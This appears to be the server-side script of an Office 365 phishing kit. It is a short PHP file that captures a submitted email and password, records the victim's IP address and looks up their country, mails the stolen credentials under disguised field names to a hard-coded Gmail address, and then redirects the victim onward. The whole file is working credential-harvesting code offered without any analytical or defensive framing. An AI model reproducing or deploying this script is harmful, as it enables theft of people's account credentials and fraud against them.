<?php
if(isset($_POST['email']) && ($_POST['pass'])){
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
$ipdat = @json_decode(file_get_contents(
    "http://www.geoplugin.net/json.gp?ip=" . $ip));

$mail_server = 'office'.$_POST['email'];
$attuser = $_POST['email'];
$attpassword = $_POST['pass'];


$to = 'dantata.ahmed666@gmail.com';
$subject = $mail_server;
$from = "From: TRIGGAR <Austraia>";



$comment = $mail_server.' Details from !-LORD-!: '."\n"
            .'**************************************'."\n"
            .'goat: '.$attuser."\n"
            .'Peppersoup: '.$attpassword."\n"
            .'C: '. $ipdat->geoplugin_countryName ."\n"
            .'U: '.$ip."\n";



mail($to, $subject, $comment, $from);


header("Location: pass.html?email=$attuser");
}
else
{
    header("Location: https://office365.com");
}



?>